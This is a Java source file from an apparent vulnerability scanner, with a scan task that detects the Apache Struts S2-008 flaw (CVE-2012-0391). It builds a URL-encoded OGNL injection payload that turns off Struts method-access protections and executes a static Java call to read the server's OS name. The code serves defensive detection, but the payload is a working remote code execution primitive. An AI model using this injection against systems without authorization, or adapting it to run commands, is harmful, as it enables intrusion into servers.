package com.shaobing.wallaby.core.jscan.apache;

import com.shaobing.wallaby.common.http.httpclient.HttpUtils;
import com.shaobing.wallaby.common.logger.LoggerUtils;
import com.shaobing.wallaby.core.jscan.common.PreambleInfo;
import com.shaobing.wallaby.core.jscan.common.ScanIssue;
import com.shaobing.wallaby.core.jscan.common.Severity;
import com.shaobing.wallaby.core.jscan.common.exception.ScanTaskRuntimeException;
import com.shaobing.wallaby.core.jscan.common.task.ScanTask;
import com.shaobing.wallaby.core.jscan.common.task.ScanTaskCallback;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 知道创宇:
 *  https://www.seebug.org/vuldb/ssvid-92088
 *  Effecct Scope : Struts 2.1.0 - Struts 2.3.1
 * <p>
 *  (1) 为了阻止攻击者调用方法,设置 xwork.MethodAccessor.denyMethodExecution=true,SecurityMemberAccess=false.
 *      Struts 2.2.1.1为了阻止访问上下文变量,改进了ParameterInterceptor的参数名称字符白名单
 *       <code>acceptedParamNames = "[a-zA-Z0-9\.][()_']+";</code>
 *  (2)在某些情况下，这些限制有可能被绕过而执行任意恶意代码。
 *      <ul>
 *          <li>
 *              <b>Remote command execution in Struts <= 2.2.1.1 (ExceptionDelegator)</b>
 *           </li>
 *           <li>
 *               <b>Remote command execution in Struts <= 2.3.1 (CookieInterceptor)</b>
 *           </li>
 *           <li>
 *                 <b>Arbitrary File Overwrite in Struts <= 2.3.1 (ParameterInterceptor)</b>
 *           </li>
 *            <li>
 *                  <b>Remote command execution in Struts <= 2.3.1 (DebuggingInterceptor)</b>
 *            </li>
 *          </li>
 *      </ul>
 * </p>
 * @author luyb@servyou.com.cn
 * @version $Id: ApacheS2008ScanTask.java v 0.1 2016/12/25 18:33 luyb Exp $$
 */
public class ApacheS2008ScanTask implements ScanTask {

    private static final Logger  LOGGER          = LoggerFactory
        .getLogger(ApacheS2008ScanTask.class);

    /** 判定操作系统名称 */
    private static final Pattern OS_NAME_PATTERN = Pattern.compile("(windows)|(linux)",
        Pattern.CASE_INSENSITIVE);

    /** CVE编号 */
    public static final String   CVE_2012_0391   = " CVE-2012-0391";

    /** 解决方案 */
    public static final String   SOLUTION        = "devmode=false";

    /** 漏洞说明 */
    public static final String   DESCRIPTION     = "http://struts.apache.org/docs/s2-008.html"
                                                   + "Remote command execution and arbitrary file overwrite, Strict DMI does not work correctly";

    @Override
    public List<ScanIssue> execute(String url, PreambleInfo preambleInfo,
                                   ScanTaskCallback scanTaskCallback) throws ScanTaskRuntimeException {
        try {
            String key = "os.name";
            StringBuilder builder = new StringBuilder();
            builder.append(url).append("debug=command&expression=")
                    .append("%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23e%3d@java.lang.System@getProperty%28%22")
                    .append(key)
                    .append("%22%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23e%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29");
            String payloadUrl = builder.toString();

            String body = HttpUtils.get(payloadUrl);
            LoggerUtils.info(LOGGER, "请求结果为{0}", body);

            List<ScanIssue> scanIssues = new ArrayList<>();
            Matcher matcher = OS_NAME_PATTERN.matcher(body);
            if (matcher.find()) {
                ScanIssue scanIssue = new ScanIssue();
                scanIssue.setCve(CVE_2012_0391);
                scanIssue.setDescription(DESCRIPTION);
                scanIssue.setSeverity(Severity.HIGH);
                scanIssue.setSolution(SOLUTION);
                scanIssue.setUrl(url);
                scanIssue.setExtInfos(preambleInfo.convertToMap());
                scanIssues.add(scanIssue);
            }
            if (scanTaskCallback != null)
                scanTaskCallback.callback();

            return scanIssues;
        } catch (Throwable e) {
            LoggerUtils.error(LOGGER, e.getMessage());
            throw new ScanTaskRuntimeException("扫描 Apache S2-008 发生错误," + e.getMessage());
        } finally {
        }
    }
}
